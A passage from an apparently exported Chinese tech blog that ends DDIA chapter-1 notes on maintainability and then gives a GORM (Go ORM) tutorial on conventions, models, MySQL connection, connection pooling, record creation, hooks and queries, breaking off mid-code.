<p>使工程师在未来能轻松地对系统进行更改，当需求变化时为新应用场景做适配。也称为 <strong>可扩展性（extensibility）</strong>、<strong>可修改性（modifiability）</strong> 或 <strong>可塑性（plasticity）</strong>。</p></li>
</ul>
<h3 id="可操作性">可操作性</h3>
<p>良好的可操作性意味着更轻松的日常工作，进而运维团队能专注于高价值的事情。数据系统可以通过各种方式使日常任务更轻松：</p>
<ul>
<li>通过<strong>良好的监控</strong>，提供对系统内部状态和运行时行为的 <strong>可见性（visibility）</strong>。</li>
<li>为<strong>自动化</strong>提供良好支持，将系统与标准化工具相集成。</li>
<li><strong>避免依赖单台机器</strong>（在整个系统继续不间断运行的情况下允许机器停机维护）。</li>
<li>提供<strong>良好的文档和易于理解的操作模型</strong>（“如果做 X，会发生 Y”）。</li>
<li>提供<strong>良好的默认行为</strong>，但需要时也允许管理员自由覆盖默认值。</li>
<li>有条件时进行<strong>自我修复</strong>，但需要时也允许管理员手动控制系统状态。</li>
<li><strong>行为可预测</strong>，最大限度减少意外。</li>
</ul>
<h3 id="简单性">简单性</h3>
<p>复杂的大型项目会显著拖慢相关人员，增大维护成本。一个陷入复杂泥潭的软件项目有时被描述为 <strong>烂泥潭（a big ball of mud）</strong> 。<strong>复杂度（complexity）</strong> 有各种可能的症状，例如：状态空间激增、模块间紧密耦合、纠结的依赖关系、不一致的命名和术语、解决性能问题的 Hack、需要绕开的特例等等。</p>
<p>因为复杂度导致维护困难时，预算和时间安排通常会超支。<strong>在复杂的软件中进行变更，引入错误的风险也更大</strong>：当开发人员难以理解系统时，隐藏的假设、无意的后果和意外的交互就更容易被忽略。相反，降低复杂度能极大地提高软件的可维护性，因此简单性应该是构建系统的一个关键目标。</p>
<p>因为复杂度导致维护困难时，预算和时间安排通常会超支。在复杂的软件中进行变更，引入错误的风险也更大：当开发人员难以理解系统时，隐藏的假设、无意的后果和意外的交互就更容易被忽略。相反，降低复杂度能极大地提高软件的可维护性，因此简单性应该是构建系统的一个关键目标。</p>
<p><strong>简化系统并不一定意味着减少功能</strong>；它也可以意味着消除 <strong>额外的（accidental）</strong> 的复杂度。 Moseley 和 Marks【32】把 <strong>额外复杂度</strong> 定义为：由具体实现中涌现，而非（从用户视角看，系统所解决的）问题本身固有的复杂度。</p>
<p>用于消除 <strong>额外复杂度</strong> 的最好工具之一是 <strong>抽象（abstraction）</strong>。一个好的抽象可以将大量实现细节隐藏在一个干净，简单易懂的外观下面。一个好的抽象也可以广泛用于各类不同应用。比起重复造很多轮子，重用抽象不仅更有效率，而且有助于开发高质量的软件。抽象组件的质量改进将使所有使用它的应用受益。</p>
<p>例如，高级编程语言是一种抽象，隐藏了机器码、CPU 寄存器和系统调用。 SQL 也是一种抽象，隐藏了复杂的磁盘 / 内存数据结构、来自其他客户端的并发请求、崩溃后的不一致性。当然在用高级语言编程时，我们仍然用到了机器码；只不过没有 <strong>直接（directly）</strong> 使用罢了，正是因为编程语言的抽象，我们才不必去考虑这些实现细节。</p>
<p>抽象可以帮助我们将系统的复杂度控制在可管理的水平，不过，找到好的抽象是非常困难的。在分布式系统领域虽然有许多好的算法，但我们并不清楚它们应该打包成什么样抽象。</p>
<h3 id="可演化性">可演化性</h3>
<p>系统的需求永远不变，基本是不可能的。更可能的情况是，它们处于常态的变化中，例如：你了解了新的事实、出现意想不到的应用场景、业务优先级发生变化、用户要求新功能、新平台取代旧平台、法律或监管要求发生变化、系统增长迫使架构变化等。</p>
<p>在组织流程方面， <strong>敏捷（agile）</strong> 工作模式为适应变化提供了一个框架。敏捷社区还开发了对在频繁变化的环境中开发软件很有帮助的技术工具和模式，如 <strong>测试驱动开发（TDD, test-driven development）</strong> 和 <strong>重构（refactoring）</strong> 。</p>
<p>修改数据系统并使其适应不断变化需求的容易程度，是与 <strong>简单性</strong> 和 <strong>抽象性</strong> 密切相关的：简单易懂的系统通常比复杂系统更容易修改。但由于这是一个非常重要的概念，我们将用一个不同的词来指代数据系统层面的敏捷性： <strong>可演化性（evolvability）</strong> 【34】。</p>
<h2 id="总结">总结</h2>
<p>第一章简要介绍了数据系统，并详细讨论了可靠性、可扩展性、可维护性。读完之后，对于三大特性的含义和相关概念有了清晰的了解。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://xie.infoq.cn/article/eda3b32806bc800173793118e">SLO（服务等级目标）与 SLA（服务等级协议）</a></li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
        <category>后端</category>
        <category>DDIA</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>设计数据密集型应用</tag>
        <tag>可靠性</tag>
        <tag>可扩展性</tag>
        <tag>可维护性</tag>
      </tags>
  </entry>
  <entry>
    <title>GORM: Golang 的 ORM 框架</title>
    <url>/blog/2024/01/20/gorm/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>ORM（Object Relational Mapping，对象关系映射）框架旨在建立面向过程中的对象与数据库中的表（即关系）之间的映射关系，为开发者提供友好的数据库交互方式。GORM 是 Golang 的热门 ORM 框架，支持 MySQL、SQLite 等多种数据源。</p>
<span id="more"></span>
<h2 id="约定">约定</h2>
<p>GORM 遵循的是 “约定大于配置” 的思想，即遵循约定可以减少配置的数量。这种思想应用广泛，例如 go 中也约定以<code>_test</code> 结尾的文件为测试文件，<code>init()</code> 函数用于模块初始化等。transformers、Spring Boot 框架中也有这种思想的体现。GORM 使用了如下约定：</p>
<ul>
<li><strong>主键</strong>：GORM 使用名为 <code>ID</code> 的字段作为每个模型的默认主键。</li>
<li><strong>表名</strong>：默认情况下，GORM 将结构名体称转换为<strong>蛇形复数</strong>化为表名称。 例如，<code>User</code> 结构体对应数据库中的 <code>users</code> 表。</li>
<li><strong>列名</strong>：GORM 自动将数据库中列名的结构体字段名转换为 <strong>蛇形</strong>。</li>
<li><strong>时间戳字段</strong>：GORM 使用名为 <code>CreatedAt</code> 和 <code>UpdatedAt</code> 的字段来自动跟踪记录的创建和更新时间。</li>
</ul>
<p>下面详细介绍。</p>
<h3 id="表名">表名</h3>
<p>GORM 约定结构体名的 <code>蛇形复数</code> 作为表名。对于结构体 <code>User</code>，根据约定，其表名为 <code>users</code>，可以通过实现 <code>Tabler</code> 接口指定 <strong>“静态”</strong> 表名：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Tabler <span class="keyword">interface</span> {</span><br><span class="line">    TableName() <span class="keyword">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// TableName 会将 User 的表名重写为 `profiles`</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(User)</span> <span class="title">TableName</span><span class="params">()</span> <span class="title">string</span></span> {</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"profiles"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><code>TableName</code> 不支持动态变化，它会被缓存下来以便后续使用。想要使用动态表名，可以使用 <code>Scopes</code>，例如：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserTable</span><span class="params">(user User)</span> <span class="title">func</span> <span class="params">(tx *gorm.DB)</span> *<span class="title">gorm</span>.<span class="title">DB</span></span> {</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">func</span> <span class="params">(tx *gorm.DB)</span> *<span class="title">gorm</span>.<span class="title">DB</span></span> {</span><br><span class="line">    <span class="keyword">if</span> user.Admin {</span><br><span class="line">      <span class="keyword">return</span> tx.Table(<span class="string">"admin_users"</span>)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tx.Table(<span class="string">"users"</span>)</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">db.Scopes(UserTable(user)).Create(&amp;user)</span><br></pre></td></tr></tbody></table></figure>
<h3 id="列名">列名</h3>
<p>GORM 约定结构体字段名的 <code>蛇形</code> 作为列名，可以通过 <code>gorm</code> 的 <code>column</code> tag 指定列名：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">  ID        <span class="keyword">uint</span>      <span class="comment">// 列名是 `id`</span></span><br><span class="line">  Name      <span class="keyword">string</span>    <span class="comment">// 列名是 `name`</span></span><br><span class="line">  Birthday  time.Time <span class="comment">// 列名是 `birthday`</span></span><br><span class="line">  CreatedAt time.Time <span class="comment">// 列名是 `created_at`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">struct</span> {</span><br><span class="line">  AnimalID <span class="keyword">int64</span>     <span class="string">`gorm:"column:beast_id"`</span>         <span class="comment">// 将列名设为 `beast_id`</span></span><br><span class="line">  Birthday time.Time <span class="string">`gorm:"column:day_of_the_beast"`</span> <span class="comment">// 将列名设为 `day_of_the_beast`</span></span><br><span class="line">  Age      <span class="keyword">int64</span>     <span class="string">`gorm:"column:age_of_the_beast"`</span> <span class="comment">// 将列名设为 `age_of_the_beast`</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="主键">主键</h3>
<p>GORM 约定 <code>ID</code> 字段作为表的主键，可以通过 <code>primarykey</code> tag 指定：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">  ID   <span class="keyword">string</span> <span class="comment">// 默认情况下，名为 `ID` 的字段会作为表的主键</span></span><br><span class="line">  Name <span class="keyword">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 `UUID` 设为主键</span></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">struct</span> {</span><br><span class="line">  ID     <span class="keyword">int64</span></span><br><span class="line">  UUID   <span class="keyword">string</span> <span class="string">`gorm:"primaryKey"`</span></span><br><span class="line">  Name   <span class="keyword">string</span></span><br><span class="line">  Age    <span class="keyword">int64</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="时间戳">时间戳</h3>
<h4 id="createdat">CreatedAt</h4>
<p>GORM 约定 <strong>CreatedAt</strong> 用于追踪记录的创建时间，并<strong>自动初始化</strong>。对于有 <code>CreatedAt</code> 字段的模型，创建记录时，如果该字段值为零值，则将该字段的值设为当前时间。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">db.Create(&amp;user) <span class="comment">// 将 `CreatedAt` 设为当前时间</span></span><br><span class="line"></span><br><span class="line">user2 := User{Name: <span class="string">"jinzhu"</span>, CreatedAt: time.Now()}</span><br><span class="line">db.Create(&amp;user2) <span class="comment">// user2 的 `CreatedAt` 不会被修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 想要修改该值，您可以使用 `Update`</span></span><br><span class="line">db.Model(&amp;user).Update(<span class="string">"CreatedAt"</span>, time.Now())</span><br></pre></td></tr></tbody></table></figure>
<h4 id="updatedat">UpdatedAt</h4>
<p>GORM 约定 <strong>UpdatedAt</strong> 用于追踪记录的更新时间，并<strong>自动赋值</strong>。对于有 UpdatedAt 字段的模型，更新记录时，将该字段的值设为当前时间。创建记录时，如果该字段值为零值，则将该字段的值设为当前时间</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">db.Save(&amp;user) <span class="comment">// 将 `UpdatedAt` 设为当前时间</span></span><br><span class="line"></span><br><span class="line">db.Model(&amp;user).Update(<span class="string">"name"</span>, <span class="string">"jinzhu"</span>) <span class="comment">// 会将 `UpdatedAt` 设为当前时间</span></span><br><span class="line"></span><br><span class="line">db.Model(&amp;user).UpdateColumn(<span class="string">"name"</span>, <span class="string">"jinzhu"</span>) <span class="comment">// `UpdatedAt` 不会被修改</span></span><br><span class="line"></span><br><span class="line">user2 := User{Name: <span class="string">"jinzhu"</span>, UpdatedAt: time.Now()}</span><br><span class="line">db.Create(&amp;user2) <span class="comment">// 创建记录时，非零值情况，user2 的 `UpdatedAt` 不会被修改</span></span><br><span class="line"></span><br><span class="line">user3 := User{Name: <span class="string">"jinzhu"</span>, UpdatedAt: time.Now()}</span><br><span class="line">db.Save(&amp;user3) <span class="comment">// 更新时，即使不是零值，user3 的 `UpdatedAt` 也会被修改为当前时间</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="模型定义">模型定义</h2>
<p>模型是 Go 中的结构体，字段类型可以是基础 Go 类型、指针或者这些类型的别名。也支持自定义类型，只要实现了来自 <code>database/sql</code> 包的 <a href="https://pkg.go.dev/database/sql/?tab=doc#Scanner">Scanner</a> 和 <a href="https://pkg.go.dev/database/sql/driver#Valuer">Valuer</a> 接口。指针的作用是允许 nili 值，与数据库中的 null 对应。</p>
<p>模型定义如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">  ID           <span class="keyword">uint</span>           <span class="comment">// Standard field for the primary key</span></span><br><span class="line">  Name         <span class="keyword">string</span>         <span class="comment">// A regular string field</span></span><br><span class="line">  Email        *<span class="keyword">string</span>        <span class="comment">// A pointer to a string, allowing for null values</span></span><br><span class="line">  Age          <span class="keyword">uint8</span>          <span class="comment">// An unsigned 8-bit integer</span></span><br><span class="line">  Birthday     *time.Time     <span class="comment">// A pointer to time.Time, can be null</span></span><br><span class="line">  MemberNumber sql.NullString <span class="comment">// Uses sql.NullString to handle nullable strings</span></span><br><span class="line">  ActivatedAt  sql.NullTime   <span class="comment">// Uses sql.NullTime for nullable time fields</span></span><br><span class="line">  CreatedAt    time.Time      <span class="comment">// Automatically managed by GORM for creation time</span></span><br><span class="line">  UpdatedAt    time.Time      <span class="comment">// Automatically managed by GORM for update time</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在该模型中：</p>
<ul>
<li>基础类型，如 <code>uint,string,uint8</code> 可以直接使用</li>
<li>指针类型，<code>*string,*time.Time</code> 代表字段可以为空</li>
<li><code>sql.NullString,sql.NullTime</code> 来自 <code>database/sql</code> 包，更方便地管理 null 值</li>
<li><code>CreatedAt,UpdatedAt</code> 由 GORM 追踪维护</li>
</ul>
<h3 id="gorm.model">gorm.Model</h3>
<p>GORM 提供了一个预先定义结构体，包含常用字段，可以嵌入在自定义结构体中。对于匿名字段，GORM 会将其字段包含在<strong>父结构体中</strong>，例如：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// gorm.Model 的定义</span></span><br><span class="line"><span class="keyword">type</span> Model <span class="keyword">struct</span> {</span><br><span class="line">  ID        <span class="keyword">uint</span>           <span class="string">`gorm:"primaryKey"`</span></span><br><span class="line">  CreatedAt time.Time</span><br><span class="line">  UpdatedAt time.Time</span><br><span class="line">  DeletedAt gorm.DeletedAt <span class="string">`gorm:"index"`</span> <span class="comment">// index tag 用于根据参数创建索引</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">  gorm.Model <span class="comment">// 嵌入匿名字段</span></span><br><span class="line">  Name <span class="keyword">string</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">  ID        <span class="keyword">uint</span>           <span class="string">`gorm:"primaryKey"`</span></span><br><span class="line">  CreatedAt time.Time</span><br><span class="line">  UpdatedAt time.Time</span><br><span class="line">  DeletedAt gorm.DeletedAt <span class="string">`gorm:"index"`</span></span><br><span class="line">  Name <span class="keyword">string</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>GORM 支持的 tag 详见<a href="https://gorm.io/zh_CN/docs/models.html">模型定义 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.</a>。</p>
<h2 id="环境准备">环境准备</h2>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">// 安装MySQL依赖</span><br><span class="line">go get -u gorm.io/driver/mysql</span><br><span class="line">// 安装Gorm依赖</span><br><span class="line">go get -u gorm.io/gorm</span><br></pre></td></tr></tbody></table></figure>
<h2 id="连接数据库">连接数据库</h2>
<p>GORM 官方支持的数据库类型有：MySQL, PostgreSQL, SQLite, SQL Server 和 TiDB。GORM 使用 DSN（Data Source Name）标识数据源，通过对应驱动的 <code>Open</code> 方法建立连接。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"database/sql"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"gorm.io/driver/mysql"</span></span><br><span class="line">	<span class="string">"gorm.io/gorm"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// DSN: Data Source Name</span></span><br><span class="line"><span class="comment">// 想要正确的处理 time.Time ，需要带上 parseTime 参数</span></span><br><span class="line"><span class="comment">// 要支持完整的 UTF-8 编码，需要将 charset=utf8 更改为 charset=utf8mb4 查看 此文章 获取详情</span></span><br><span class="line"><span class="comment">// WSL 连接 windows mysql: export HOST_IP=$(grep -oP '(?&lt;=nameserver\ ).*' /etc/resolv.conf)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">formatDSN</span><span class="params">(username, password, host <span class="keyword">string</span>, port <span class="keyword">int</span>, dbName <span class="keyword">string</span>)</span> <span class="title">string</span></span> {</span><br><span class="line">	<span class="keyword">return</span> fmt.Sprintf(<span class="string">"%s:%s@tcp(%s:%d)/%s?charset=utf8mb4&amp;parseTime=True&amp;loc=Local"</span>, username, password, host, port, dbName)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">	dsn := formatDSN(username, password, host, port, dbName)</span><br><span class="line">    <span class="comment">// 连接数据库</span></span><br><span class="line">	db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config{})</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">"failed to connect database, error="</span> + err.Error())</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>MySQL 驱动程序提供了一些初始配置，如：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">db, err := gorm.Open(mysql.New(mysql.Config{</span><br><span class="line">  DSN: <span class="string">"gorm:gorm@tcp(127.0.0.1:3306)/gorm?charset=utf8&amp;parseTime=True&amp;loc=Local"</span>, <span class="comment">// DSN data source name</span></span><br><span class="line">  DefaultStringSize: <span class="number">256</span>, <span class="comment">// string 类型字段的默认长度</span></span><br><span class="line">  DisableDatetimePrecision: <span class="literal">true</span>, <span class="comment">// 禁用 datetime 精度，MySQL 5.6 之前的数据库不支持</span></span><br><span class="line">  DontSupportRenameIndex: <span class="literal">true</span>, <span class="comment">// 重命名索引时采用删除并新建的方式，MySQL 5.7 之前的数据库和 MariaDB 不支持重命名索引</span></span><br><span class="line">  DontSupportRenameColumn: <span class="literal">true</span>, <span class="comment">// 用 `change` 重命名列，MySQL 8 之前的数据库和 MariaDB 不支持重命名列</span></span><br><span class="line">  SkipInitializeWithVersion: <span class="literal">false</span>, <span class="comment">// 根据当前 MySQL 版本自动配置</span></span><br><span class="line">}), &amp;gorm.Config{})</span><br></pre></td></tr></tbody></table></figure>
<h3 id="连接池">连接池</h3>
<p>GORM 使用 <a href="https://pkg.go.dev/database/sql">database/sql</a> 来维护连接池</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">sqlDB, err := db.DB()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大空闲连接数量</span></span><br><span class="line">sqlDB.SetMaxIdleConns(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大打开连接数</span></span><br><span class="line">sqlDB.SetMaxOpenConns(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接最大时长</span></span><br><span class="line">sqlDB.SetConnMaxLifetime(time.Hour)</span><br></pre></td></tr></tbody></table></figure>
<h2 id="操作数据库">操作数据库</h2>
<h3 id="创建表">创建表</h3>
<p>GORM 支持 Migration 特性，支持根据 Go Struct 结构自动生成对应的表结构。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 users 表</span></span><br><span class="line">db.AutoMigrate(&amp;User{})</span><br><span class="line"><span class="comment">// 一次创建User、Product、Order三个结构体对应的表结构</span></span><br><span class="line">db.AutoMigrate(&amp;User{}, &amp;Product{}, &amp;Order{})</span><br><span class="line"><span class="comment">// 可以通过Set设置附加参数，下面设置表的存储引擎为InnoDB</span></span><br><span class="line">db.Set(<span class="string">"gorm:table_options"</span>, <span class="string">"ENGINE=InnoDB"</span>).AutoMigrate(&amp;User{})</span><br></pre></td></tr></tbody></table></figure>
<h3 id="创建记录">创建记录</h3>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">user := User{Name: <span class="string">"Jinzhu"</span>, Age: <span class="number">18</span>, Birthday: time.Now()}</span><br><span class="line"></span><br><span class="line">result := db.Create(&amp;user) <span class="comment">// 通过数据的指针来创建</span></span><br><span class="line"></span><br><span class="line">user.ID             <span class="comment">// 返回插入数据的主键</span></span><br><span class="line">result.Error        <span class="comment">// 返回 error</span></span><br><span class="line">result.RowsAffected <span class="comment">// 返回插入记录的条数</span></span><br></pre></td></tr></tbody></table></figure>
<p>可以传入切片批量创建多条记录，适用于<strong>高效地插入大量记录</strong>的场景，GORM 将生成<strong>一条 SQL</strong> 来插入所有数据，以返回所有主键值，并触发 <code>Hook</code> 方法</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> users = []User{{Name: <span class="string">"jinzhu1"</span>}, {Name: <span class="string">"jinzhu2"</span>}, {Name: <span class="string">"jinzhu3"</span>}}</span><br><span class="line">result := db.Create(users) <span class="comment">// 传递切片以插入多行数据</span></span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> users {</span><br><span class="line">  user.ID <span class="comment">// 1,2,3</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>GORM 也支持传入 map 创建记录，适用于已有列 - 值 <code>map</code> 关系的场景，省去转为结构体的时空开销。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">db.Model(&amp;User{}).Create(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{</span><br><span class="line">  <span class="string">"Name"</span>: <span class="string">"jinzhu"</span>, <span class="string">"Age"</span>: <span class="number">18</span>,</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// batch insert from `[]map[string]interface{}{}`</span></span><br><span class="line">db.Model(&amp;User{}).Create([]<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{</span><br><span class="line">  {<span class="string">"Name"</span>: <span class="string">"jinzhu_1"</span>, <span class="string">"Age"</span>: <span class="number">18</span>},</span><br><span class="line">  {<span class="string">"Name"</span>: <span class="string">"jinzhu_2"</span>, <span class="string">"Age"</span>: <span class="number">20</span>},</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<h4 id="hooks">Hooks</h4>
<p>GORM 允许用户定义的钩子有 <code>BeforeSave, BeforeCreate, AfterSave, AfterCreate</code> 创建记录时将调用这些钩子方法。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span> <span class="title">BeforeCreate</span><span class="params">(tx *gorm.DB)</span> <span class="params">(err error)</span></span> {</span><br><span class="line">  u.UUID = uuid.New()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.Role == <span class="string">"admin"</span> {</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">"invalid role"</span>)</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">// 跳过钩子</span></span><br><span class="line">DB.Session(&amp;gorm.Session{SkipHooks: <span class="literal">true</span>}).Create(&amp;user)</span><br><span class="line"></span><br><span class="line">DB.Session(&amp;gorm.Session{SkipHooks: <span class="literal">true</span>}).Create(&amp;users)</span><br><span class="line"></span><br><span class="line">DB.Session(&amp;gorm.Session{SkipHooks: <span class="literal">true</span>}).CreateInBatches(users, <span class="number">100</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="查询记录">查询记录</h3>
<p>GORM 提供了 <code>First</code>、<code>Take</code>、<code>Last</code> 方法，以便从数据库中检索单个对象。当查询数据库时它添加了 <code>LIMIT 1</code> 条件，且没有找到记录时，它会返回 <code>ErrRecordNotFound</code> 错误。要避免这个错误可以使用 <code>Find</code> 函数。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 获取第一条记录（主键升序）</span></span><br><span class="line">db.First(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users ORDER BY id LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一条记录，没有指定排序字段</span></span><br><span class="line">db.Take(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取最后一条记录（主键降序）</span></span><br><span class="line">db.Last(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users ORDER BY id DESC LIMIT 1;</span></span><br><span class="line"></span><br><span class="line">result := db.First(&amp;user)</span><br><span class="line">result.RowsAffected <span class="comment">// 返回找到的记录数</span></span><br><span class="line">result.Error        <span class="comment">// returns error or nil</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 ErrRecordNotFound 错误</span></span><br><span class="line">errors.Is(result.Error, gorm.ErrRecordNotFound)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h4 id="主键检索">主键检索</h4>
<p><code>db.First/Find</code> 函数中的第二个参数，传入主键值。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 单条</span></span><br><span class="line"><span class="comment">// 整型主键</span></span><br><span class="line">db.First(&amp;user, <span class="number">10</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 10;</span></span><br><span class="line"><span class="comment">// uuid 字符串 主键</span></span><br><span class="line">db.First(&amp;user, <span class="string">"id = ?"</span>, <span class="string">"1b74413f-f3b8-409f-ac47-e8c062e3472a"</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = "1b74413f-f3b8-409f-ac47-e8c062e3472a";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多条</span></span><br><span class="line">db.Find(&amp;users, []<span class="keyword">int</span>{<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>})</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id IN (1,2,3);</span></span><br></pre></td></tr></tbody></table></figure>
<p>也可以设置目标对象的主键值，构成查询条件，例子如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user = User{ID: <span class="number">10</span>}</span><br><span class="line">db.First(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 10;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result User</span><br><span class="line">db.Model(User{ID: <span class="number">10</span>}).First(&amp;result)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 10;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h4 id="条件">条件</h4>
<h5 id="string条件">string 条件</h5>
<p>GORM 也支持格式化 sql 作为 where 的条件，例子如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Get first matched record</span></span><br><span class="line">db.Where(<span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>).First(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = 'jinzhu' ORDER BY id LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get all matched records</span></span><br><span class="line">db.Where(<span class="string">"name &lt;&gt; ?"</span>, <span class="string">"jinzhu"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name &lt;&gt; 'jinzhu';</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IN</span></span><br><span class="line">db.Where(<span class="string">"name IN ?"</span>, []<span class="keyword">string</span>{<span class="string">"jinzhu"</span>, <span class="string">"jinzhu 2"</span>}).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name IN ('jinzhu','jinzhu 2');</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LIKE</span></span><br><span class="line">db.Where(<span class="string">"name LIKE ?"</span>, <span class="string">"%jin%"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name LIKE '%jin%';</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// AND</span></span><br><span class="line">db.Where(<span class="string">"name = ? AND age &gt;= ?"</span>, <span class="string">"jinzhu"</span>, <span class="string">"22"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = 'jinzhu' AND age &gt;= 22;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Time</span></span><br><span class="line">db.Where(<span class="string">"updated_at &gt; ?"</span>, lastWeek).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE updated_at &gt; '2000-01-01 00:00:00';</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 